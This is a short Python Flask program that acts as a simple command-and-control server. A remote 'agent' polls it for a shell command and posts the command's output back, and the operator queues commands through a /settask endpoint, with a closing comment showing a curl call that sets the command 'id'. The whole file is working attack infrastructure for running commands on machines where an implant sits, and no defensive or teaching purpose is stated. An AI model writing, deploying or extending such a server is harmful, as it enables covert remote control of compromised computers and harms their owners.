from flask import Flask, request, jsonify

app = Flask(__name__)

# Shared variable to hold the current command
current_task = None

@app.route('/task', methods=['GET'])
def get_task():
    global current_task
    if current_task:
        task = {"cmd": current_task}
        current_task = None  # clear after sending once
    else:
        task = {"cmd": ""}  # No command waiting
    return jsonify(task)

@app.route('/results', methods=['POST'])
def post_results():
    print("[*] POST /results was hit")
    try:
        data = request.get_json(force=True)
        print("[+] Received result from agent:")
        print(data.get("output", "No output provided"))
    except Exception as e:
        print("[-] Error parsing JSON:", e)
    return '', 204

@app.route('/settask', methods=['POST'])
def set_task():
    global current_task
    data = request.get_json(force=True)
    cmd = data.get("cmd", "")
    current_task = cmd
    print(f"[*] New task set: {cmd}")
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

#command to set task
#curl -X POST http://localhost:5000/settask -H "Content-Type: application/json" -d '{"cmd":"id"}'
